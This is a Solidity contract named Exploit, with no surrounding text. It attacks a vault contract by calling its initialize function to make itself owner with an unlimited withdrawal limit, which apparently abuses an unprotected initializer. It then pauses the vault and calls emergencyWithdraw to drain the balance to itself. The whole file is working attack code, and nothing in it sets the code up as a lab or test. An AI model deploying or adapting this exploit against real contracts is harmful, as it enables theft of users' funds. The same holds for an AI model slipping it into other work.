pragma solidity 0.8.28;

interface IVault {
    function initialize(address owner_, uint256 withdrawLimit_) external;
    function setPaused(bool p) external;
    function emergencyWithdraw(address payable to) external;
}

contract Exploit {
    address public vault;

    constructor(address target) payable {
        vault = target;
    }

    function run() external {
        IVault v = IVault(vault);
        v.initialize(address(this), type(uint256).max);
        v.setPaused(true);
        v.emergencyWithdraw(payable(address(this)));
    }

    receive() external payable {}
}
